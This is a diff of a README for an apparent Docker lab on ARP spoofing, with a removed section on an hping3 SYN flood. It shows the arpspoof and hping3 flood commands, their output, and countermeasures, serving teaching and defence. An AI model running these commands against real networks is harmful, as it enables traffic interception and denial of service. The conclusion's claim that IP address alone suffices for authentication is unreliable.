@@ -30,37 +30,73 @@ arpspoof mounts an ARP spoofing attack against a host on the local network. This
 
 ### How to run
 - execute docker-compose: `docker-compose up`
-- access to machine_1 bash: `docker exec -it machine_1 bash`
-- access to pirate bash: `docker exec -it pirate bash`
-- then execute in sequence these commands:
-  - machine_1: ``
-  - pirate: ``
+- in both `pirate` and `machine_1`, we execute `goal.bash` wich will execute the sequence of commands inside `.env` file
+  - `docker exec -it machine_1 goal.bash`
+  - `docker exec -it pirate goal.bash`
+
 
 ### Result
-- before executing the attack:
-![before_attack](demonstration/before_attack.png)
-
-- after executing the attack:
-![after_attack](demonstration/after_attack.png)
-
+We'll have as a result:
+- machine_1
+``` bash
+>>> press <enter> to execute (traceroute $IP_MACHINE_2)
+traceroute to 10.10.10.3 (10.10.10.3), 30 hops max, 60 byte packets
+ 1  machine_2.exercice_3_network_ip (10.10.10.3)  0.187 ms  0.060 ms  0.061 ms
+>>> press <enter> to execute (arp -a)
+machine_2.exercice_3_network_ip (10.10.10.3) at 02:42:0a:0a:0a:03 [ether] on eth0
 ```
-[MohamedAmin@samet TP1]$ sudo docker exec -it pirate bash
-[root@3186b137c19b /]# hping3 --flood -p 80 -S pirate
-HPING pirate (eth0 10.10.10.4): S set, 40 headers + 0 data bytes
-hping in flood mode, no replies will be shown
+- pirate
+``` bash
+>>> press <enter> to execute (arpspoof -t $IP_MACHINE_1 $IP_MACHINE_2)
+2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
+2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
+2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
+2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
+2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
+2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
+2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at
 ```
+- machine_1
+``` bash
+>>> press <enter> to execute (arp -a)
+machine_2.exercice_3_network_ip (10.10.10.3) at 02:42:0a:0a:0a:04 [ether] on eth0
+pirate.exercice_3_network_ip (10.10.10.4) at 02:42:0a:0a:0a:04 [ether] on eth0
+
+>>> press <enter> to execute (traceroute $IP_MACHINE_2)
+traceroute to 10.10.10.3 (10.10.10.3), 30 hops max, 60 byte packets
+ 1  pirate.exercice_3_network_ip (10.10.10.4)  0.120 ms  0.060 ms  0.048ms
+ 2  machine_2.exercice_3_network_ip (10.10.10.3)  0.079 ms  0.064 ms  0.067 ms
+```
+- pirate
+``` bash
+>>> press <enter> to execute (arpspoof -t $IP_MACHINE_2 $IP_MACHINE_1)
+2:42:a:a:a:4 2:42:a:a:a:3 0806 42: arp reply 10.10.10.2 is-at 2:42:a:a:a:4
+2:42:a:a:a:4 2:42:a:a:a:3 0806 42: arp reply 10.10.10.2 is-at 2:42:a:a:a:4
+2:42:a:a:a:4 2:42:a:a:a:3 0806 42: arp reply 10.10.10.2 is-at 2:42:a:a:a:4
+2:42:a:a:a:4 2:42:a:a:a:3 0806 42: arp reply 10.10.10.2 is-at 2:42:a:a:a:4
+```
+
+> full log will be stored in [./log/output.log](./log/output.log)
+
 
 ## Interpretation
-- The pirate sends sequence of requests to the server in high frequency.
-- The server has to interprete each of these requests and thats makes it busy
-- CPU status of the server becomes very high after executing the attack
-- If the server has lower specifications, it will be fully charged and it may not have the opporunity to manage requests from real users
+- After `arpspoof` attack, a new line has been added to the arp table showen insde `machine_1` 
+  - `pirate.exercice_3_network_ip (10.10.10.4) at 02:42:0a:0a:0a:04 [ether] on eth0`
+  - The mac address of the target `machine_1` has been changed from `02:42:0a:0a:0a:03` to `02:42:0a:0a:0a:04` which is the mac adress of the pirate.
+- When executing traceroute to `machine_2`, a new line has been added
+  -  `1  pirate.exercice_3_network_ip (10.10.10.4)  0.120 ms  0.060 ms  0.048ms`
+  -  The requesets to `machine_2` will be recieved by `pirate`
+- In the end, we send `arpspoof` attack to `machine_2`
+
+
+
 
 ## Conclusion
-- Every accessible server may be target of Flooding attack
-- As counter measurment to Flooding attack, detect earlier the DoS attack and prevent massive SynFlooding by blocking attackers addresses.
-- Blocking and detecting DoS attack may be really easy. But in case of attack from multiple devices or zombie clients (DDos), it may be really hard to distinguish the real clients from the fake ones.
-
+- We should consider only ip address as the unique method for authentication.
+- As counter measurment, we have to use other anti-arp solutions like:
+  - DHCP snopping
+  - cisco..
+  - Xarp,.. 
 
 
 
